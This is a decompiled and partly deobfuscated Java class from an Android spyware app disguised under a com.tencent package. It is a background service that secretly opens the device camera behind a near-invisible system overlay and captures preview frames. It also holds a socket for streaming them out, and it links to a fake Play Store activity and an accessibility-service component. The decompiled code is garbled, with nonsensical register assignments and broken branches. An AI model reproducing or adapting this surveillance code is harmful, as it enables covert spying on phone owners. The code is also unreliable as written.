package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SecondaryBackgroundService
 * Original: Lcom/tencent/tunesxconcerningn106;
 */
public class SecondaryBackgroundService extends Service implements SurfaceHolder$Callback; {

    // === FIELDS ===
    public static Camera c_tunesxconcerningn106_m;
    public static WindowManager$LayoutParams la_tunesxconcerningn106_y;
    public static OutputStream o_tunesxconcerningn106_ut;
    public static SurfaceView s_tunesxconcerningn106_fw;
    public static Socket s_tunesxconcerningn106_k;
    static SecondaryBackgroundService st;
    private static Object syc;
    public static WindowManager w_tunesxconcerningn106_m;
    public boolean Lo;
    private List b_tunesxconcerningn106_ts;
    public boolean ctd;
    private int q4;
    public boolean usd;
    private String[] vul;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = new Object();
        // new Object()
        SecondaryBackgroundService.syc = v0;
        return;
    }

    public void Constructor() {
        // new Service()
        v0 = 0;
        v1.usd = 0;
        v1.ctd = 0;
        v1.Lo = 0;
        // new ArrayList()
        v1.b_tunesxconcerningn106_ts = 0;
        v0 = 50;
        v1.q4 = 50;
        return;
    }

    static void access$000(SecondaryBackgroundService param0) {
        v0.di();
        return;
    }

    static Object access$100() {
        v0 = SecondaryBackgroundService.syc;
        return v0;
    }

    static List access$200(SecondaryBackgroundService param0) {
        v0 = v0.b_tunesxconcerningn106_ts;
        return v0;
    }

    static String[] access$300(SecondaryBackgroundService param0) {
        v0 = v0.vul;
        return v0;
    }

    static int access$400(SecondaryBackgroundService param0) {
        v0 = v0.q4;
        return v0;
    }

    static int access$402(SecondaryBackgroundService param0, int param1) {
        v0.q4 = v1;
        return v1;
    }

    static int access$500(SecondaryBackgroundService param0, int param1, int param2) {
        v0.q(v1, v2);
        return v0;
    }

    private void di() {
        v0 = 0;
        v1.Lo = 0;
        MainBackgroundService.F_tunesxconcerningn1011_ORCA = 0;
        0.shutdownOutput();
        0.shutdownInput();
        0.getOutputStream();
        0.close();
        0.getInputStream();
        0.close();
        0.close();
        if (0 == null || 0 == 0) { // goto +8
        0.close();
        v0 = 0;
        SecondaryBackgroundService.o_tunesxconcerningn106_ut = 0;
        return;
    }

    private int q(int param0, int param1) {
        v0 = 61440;
        if (v2 <= 61440) { // goto +5
        v3 = 15;
        // goto (branch)
        v0 = 51200;
        if (v2 <= 51200) { // goto +5
        v3 = 25;
        // goto (branch)
        v0 = 40960;
        if (v2 <= 40960) { // goto +5
        v3 = 35;
        // goto (branch)
        v0 = 30720;
        if (v2 <= 30720) { // goto +5
        v3 = 45;
        // goto (branch)
        v0 = 20480;
        if (v2 <= 20480) { // goto +5
        v3 = 65;
        // goto (branch)
        v0 = 10240;
        if (v2 <= 10240) { // goto +4
        v3 = 75;
        return 75;
    }

    public void Completed_tunesxconcerningn106_App(String param0, int param1) {
        v0 = new Thread();
        v1 = new SecondaryBackgroundService$1();
        // new SecondaryBackgroundService$1(v2, v3, v4)
        // new Thread(v1)
        v0.start();
        return;
    }

    public boolean c_tunesxconcerningn106_k() {
        v0 = Camera.open();
        if (v0 == null || v0 == 0) { // goto +5
        v0.release();
        v0 = 0;
        return 0;
        throw 0;
        v0 = 1;
        return 1;
    }

    public IBinder onBind(Intent param0) {
        v1 = 0;
        return 0;
    }

    public void onDestroy() {
        v1.onDestroy();
        v0 = 0;
        DataPackagingEngine.s_tunesxconcerningn103_f1 = 0;
        v0 = 0;
        SecondaryBackgroundService.st = 0;
        v1.sp();
        return;
    }

    public int onStartCommand(Intent param0, int param1, int param2) {
        v0 = v19;
        v1 = v20;
        v2 = 2;
        v3 = new Intent();
        v5 = SecondaryBackgroundService.getApplicationContext(...);
        v5 = FakePlayStoreActivity.class;
        // new Intent(v4, v5)
        v4 = "xyz";
        v3 = v3.setAction("xyz");
        v0.sendBroadcast(v3);
        v3 = InstalledAppsScanner.FTX1;
        v4 = 1;
        if (v1 == null || v1 == 0) { // goto +202
        v1.hasExtra(v3);
        if (v5 == null || v5 == 0) { // goto +196
        v6 = DataPackagingEngine.NeedSuper();
        v6 = 51;
        if (v5 == null || v5 == 0) { // goto +76
        v5 = AccessibilityServiceCore.tunesxconcerningn1012wm;
        if (v5 == null || v5 == 0) { // goto +72
        v5 = AccessibilityServiceCore.tunesxconcerningn1012lay;
        if (v5 == null || v5 == 0) { // goto +68
        v1 = v1.getStringArrayExtra(v3);
        v0.vul = v1;
        v1 = SecondaryBackgroundService.c_tunesxconcerningn106_k(...);
        v0.usd = v1;
        if (v1 != null && v1 != 0) { // goto +50
        v1 = new SurfaceView();
        // new SurfaceView(v0)
        SecondaryBackgroundService.s_tunesxconcerningn106_fw = v1;
        v1 = AccessibilityServiceCore.tunesxconcerningn1012lay;
        v1.gravity = 51;
        v1 = AccessibilityServiceCore.tunesxconcerningn1012wm;
        v3 = SecondaryBackgroundService.s_tunesxconcerningn106_fw;
        v5 = AccessibilityServiceCore.tunesxconcerningn1012lay;
        v1.addView(v3, v5);
        v1 = SecondaryBackgroundService.s_tunesxconcerningn106_fw;
        v1 = v1.getHolder();
        v1.addCallback(v0);
        v1 = v0.vul;
        v3 = v1[1];
        v1 = v1[2];
        Integer.valueOf(v1);
        v1.intValue();
        v0.Completed_tunesxconcerningn106_App(v3, v1);
        // goto (branch)
        SecondaryBackgroundService.sp(...);
        // goto (branch)
        v1 = v1.getStringArrayExtra(v3);
        v0.vul = v1;
        v1 = SecondaryBackgroundService.c_tunesxconcerningn106_k(...);
        v0.usd = v1;
        if (v1 != null && v1 != 0) { // goto +97
        v1 = "window";
        v0.getSystemService("window");
        SecondaryBackgroundService.w_tunesxconcerningn106_m = "window";
        // new SurfaceView(v0)
        SecondaryBackgroundService.s_tunesxconcerningn106_fw = "window";
        v3 = 26;
        if ("window" < 26) { // goto +18
        v8 = 1;
        v9 = 1;
        v10 = 2038;
        v11 = 56;
        v12 = -3;
        v7 = "window";
        WindowManager$LayoutParams.<init>(...);
        SecondaryBackgroundService.la_tunesxconcerningn106_y = "window";
        // goto (branch)
        v14 = 1;
        v15 = 1;
        v16 = 2006;
        v17 = 262144; // 0x40000
        v18 = -3;
        v13 = "window";
        WindowManager$LayoutParams.<init>(...);
        SecondaryBackgroundService.la_tunesxconcerningn106_y = "window";
        "window".gravity = 51;
        v5 = SecondaryBackgroundService.la_tunesxconcerningn106_y;
        "window".addView(26, v5);
        "window".getHolder();
        "window".addCallback(v0);
        Integer.valueOf("window");
        "window".intValue();
        v0.Completed_tunesxconcerningn106_App(26, "window");
        // goto (branch)
        SecondaryBackgroundService.sp(...);
        return 1;
        return 2;
    }

    public void p_tunesxconcerningn106_r() {
        v0 = new Thread();
        v1 = new SecondaryBackgroundService$3();
        // new SecondaryBackgroundService$3(v2)
        // new Thread(v1)
        v0.start();
        return;
    }

    public void sp() {
        v0 = SecondaryBackgroundService.c_tunesxconcerningn106_m;
        if (v0 == null || v0 == 0) { // goto +13
        v1 = 0;
        v0.setPreviewCallback(0);
        v0 = SecondaryBackgroundService.c_tunesxconcerningn106_m;
        v0.release();
        SecondaryBackgroundService.c_tunesxconcerningn106_m = 0;
        v2.di();
        v0 = v2.usd;
        if (v0 != null && v0 != 0) { // goto +9
        v0 = AccessibilityServiceCore.tunesxconcerningn1012wm;
        v0.removeView(0);
        v0 = 0;
        v2.usd = 0;
        // new Intent(v2, 0)
        v2.stopService(0);
        return;
    }

    public void surfaceChanged(SurfaceHolder param0, int param1, int param2, int param3) {
        v1 = SecondaryBackgroundService.c_tunesxconcerningn106_m;
        if (v1 == null || v1 == 0) { // goto +10
        v2 = new SecondaryBackgroundService$2();
        // new SecondaryBackgroundService$2(v0)
        v1.setPreviewCallback(v2);
        return;
    }

    public void surfaceCreated(SurfaceHolder param0) {
        v0 = "continuous-video";
        v1 = v7.vul;
        v2 = 0;
        v1 = v1[0];
        Integer.valueOf(v1);
        v1 = v1.intValue();
        v1 = Camera.open(v1);
        SecondaryBackgroundService.c_tunesxconcerningn106_m = v1;
        v1 = SecondaryBackgroundService.c_tunesxconcerningn106_m;
        v1.getParameters();
        v3 = 0.getParameters();
        v3 = 0.getSupportedPreviewSizes();
        v3 = 0;
        if (0 == null || 0 == 0) { // goto +42
        0.getParameters();
        0.getSupportedPreviewSizes();
        0.iterator();
        0.hasNext();
        if (v4 == null || v4 == 0) { // goto +22
        v4 = 0.next();
        v4 = (Camera$Size) v4;
        v5 = v4.width;
        v6 = 600;
        if (v5 <= 600) { // goto +-16
        v5 = v4.height;
        v6 = 400;
        if (v5 <= 400) { // goto +-22
        // goto (branch)
        if (0 != null && 0 != 0) { // goto +10
        v2 = 640;
        0.width = 640;
        v2 = 480;
        0.height = 480;
        v4 = 4;
        v4 = Integer.valueOf(480);
        v4 = 480.intValue();
        v4 = 1;
        if (480 != 1) { // goto +15
        v1.getSupportedFocusModes();
        480.contains("continuous-video");
        if (480 == null || 480 == 0) { // goto +5
        v1.setFocusMode("continuous-video");
        v1.setPreviewSize("continuous-video", 480);
        v0 = 17;
        v1.setPreviewFormat(17);
        17.setParameters(v1);
        17.setPreviewDisplay(v8);
        v8 = SecondaryBackgroundService.c_tunesxconcerningn106_m;
        v8.startPreview();
        return;
    }

    public void surfaceDestroyed(SurfaceHolder param0) {
        return;
    }
}
